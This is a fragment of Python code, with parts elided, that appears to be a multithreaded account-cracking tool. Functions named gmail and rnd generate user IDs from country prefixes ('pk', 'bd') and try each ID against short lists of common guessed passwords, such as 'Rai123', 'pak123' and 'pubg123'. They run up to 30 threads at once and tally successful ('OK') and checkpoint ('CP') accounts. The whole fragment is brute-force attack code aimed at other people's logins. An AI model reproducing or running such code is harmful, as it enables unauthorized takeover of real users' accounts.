...
def gmail():
	...
	with tred(max_workers=30) as Rai:
		total = str(len(fo))
		clear()
		...
		for user in fo:
			...
			Rai.submit(rd,ids,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rnd():
	...
	with tred(max_workers=15) as Rai:
		clear()
		...
		for psx in user:
			ids = code+psx
			if 'pk' in ck:
				passlist = [psx,ids,'RaiRai','kingRai','Rai1122','janjan','pak123','Rai12345','Rai123','pubg123','baloch']
			#	passlist = [psx,ids,'RaiRai','kingRai','Rai1122']
			elif 'bd' in ck:
				...
				passlist = [ids,psx,'Rai12','Rai1234','Rai123','baloch123','Rai1122','Rai12345','Rai123456','RaiRai']
			Rai.submit(rd,ids,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' The process has completed')
